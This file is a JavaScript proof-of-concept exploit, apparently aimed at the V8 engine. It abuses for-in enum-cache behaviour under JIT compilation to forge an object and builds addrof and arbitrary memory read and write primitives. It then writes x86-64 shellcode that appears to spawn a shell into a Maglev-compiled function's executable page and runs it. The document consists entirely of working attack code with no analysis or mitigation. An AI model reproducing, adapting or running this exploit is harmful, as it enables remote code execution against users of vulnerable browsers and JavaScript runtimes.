new ArrayBuffer(0x7fe00000);
let fakeobj = null;
var arr_buf = new ArrayBuffer(8);
var arr_buf2 = new ArrayBuffer(8);
var f64_arr = new Float64Array(arr_buf);
var b64_arr = new BigInt64Array(arr_buf);
let u32_arr = new Uint32Array(arr_buf);
function ftoi(f) {
    f64_arr[0] = f;
    return b64_arr[0];
}
function itof(i) {
    b64_arr[0] = i;
    return f64_arr[0];
}
function smi(i) {
    return i << 1n;
}
function hex(i) {
    return "0x" + i.toString(16);
}
function gc_minor() {
    for (let i = 0; i < 0x100; i++) {
        new ArrayBuffer(0x10000);
    }
}

const object1 = {};
object1.a = 0x4141 | 0;
const object2 = {};
object2.a = 16705;
object2.b = 3;
const object3 = {};
object3.a = 4;
object3.b = 5;
object3.c = 6;

for (let key in object2) { }

function trigger(callback) {
    for (let key in object2) {
        callback(object2[key]);
    }
}


let fake_obj_arr = [
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    123.456, 1.6203561418663524e-310, 13.37, 13.37, 13.37, 13.37, 13.37, 1.1395133238814069e-311, 4.3458484204371709e-311, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37,
    13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37,
    13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37,
    13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37,
    13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37,
    13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37,
];
fake_obj_arr[0] = 123.456;

for (let i = 0; i < 0x500; i++) {
    trigger(_ => _);
    trigger(_ => _);
    trigger(_ => _);
    trigger(_ => _);
}

new ArrayBuffer(0x7fe00000);
print("[*] test fakeobj is instanceof Array: " + (fakeobj instanceof Array));
trigger((v) => {
    object3.c = 1.1;
    for (let key in object1) { }
    fakeobj = v;
});

print("[*] setup initial fakeobj");
print("[*] test fakeobj is instanceof Array: " + (fakeobj instanceof Array));
print("[*] length of fakeobj: " + hex(fakeobj.length));

let target_arr0 = [6.9533558079506651e-310, 2.2, 3.3, 4.4];
let target_arr1 = [13.37, 13.37, 3.3, 4.4];
let target_arr2 = [13.37, 13.37, 13.37, {}, 13.37, 13.37, 13.37, 13.37];
let target_arr3 = new Uint32Array(arr_buf2);

// %DebugPrint(target_arr);
// while(1) { }

target_arr3[0] = 0x41414141;
target_arr3[1] = 0x42424242;
target_arr3[2] = 0x43434343;
target_arr3[3] = 0x44444444;

print("[*] set elements address");
fake_obj_arr[56] = 4.3458484204371709e-311;
for (let i = 0; i < 0x30; ++i) {
    print("[*]  => fakeobj["+i+"]: "+hex(ftoi(fakeobj[i])));
}

heap_addr = ftoi(fakeobj[39]);
print("[+] heap_addr: " + hex(heap_addr));
fakeobj[39] = itof(heap_addr-0x10n);

js_heap_low = target_arr3[0];
js_heap_high = target_arr3[1];
js_heap = BigInt(js_heap_low) | (BigInt(js_heap_high) << 32n);
print("[+] js_heap: " + hex(js_heap));

function addrof(obj) {
    target_arr2[0] = obj;
    f = ftoi(fakeobj[25]);
    return (js_heap & 0xffffffff00000000n) | (f & 0xffffffffn);
}

function fake_obj(obj_addr) {
    f = itof(obj_addr);
    fakeobj[25] = f;
    return target_arr2[0];
}

function arb_read32(addr) {
    fakeobj[39] = itof(addr);
    return target_arr3[0];
}

function arb_write32(addr, val) {
    fakeobj[39] = itof(addr);
    target_arr3[0] = val;
}

// trigger MAGLEV
function foo() {
    return [
        1.0,
        1.95538254221075331056310651818E-246,
        1.95606125582421466942709801013E-246,
        1.99957147195425773436923756715E-246,
        1.95337673326740932133292175341E-246,
        2.63486047652296056448306022844E-284];
}
for (let i = 0; i < 0x1000; i++) {
    foo(); 
}

let foo_addr = addrof(foo);
print("[+] foo_addr: " + hex(foo_addr));

let maglev_addr = BigInt(arb_read32(foo_addr - 1n + 0xcn));
maglev_addr |= (js_heap & 0xffffffff00000000n);
print("[+] maglev_addr: " + hex(maglev_addr));

let jmp_addr = maglev_addr - 0x1n + 0x10n;
let rwx_addr_low = BigInt(arb_read32(jmp_addr));
let rwx_addr_high = BigInt(arb_read32(jmp_addr + 4n));
let rwx_addr = rwx_addr_low | (rwx_addr_high << 32n);
print("[+] rwx_addr: " + hex(rwx_addr));

var shellcode = [
    0x6e69622fb848686an,
    0xe7894850732f2f2fn,
    0x2434810101697268n,
    0x6a56f63101010101n,
    0x894856e601485e08n,
    0x050f583b6ad231e6n
];

for (let i = 0; i < shellcode.length; i++) {
    let sc = shellcode[i];
    let sc_low = Number(sc & 0xffffffffn);
    let sc_high = Number(sc >> 32n);
    arb_write32(rwx_addr + BigInt(i * 8), sc_low);
    arb_write32(rwx_addr + BigInt(i * 8 + 4), sc_high);
}

foo();

while(1) { }
// %SystemBreak();%  
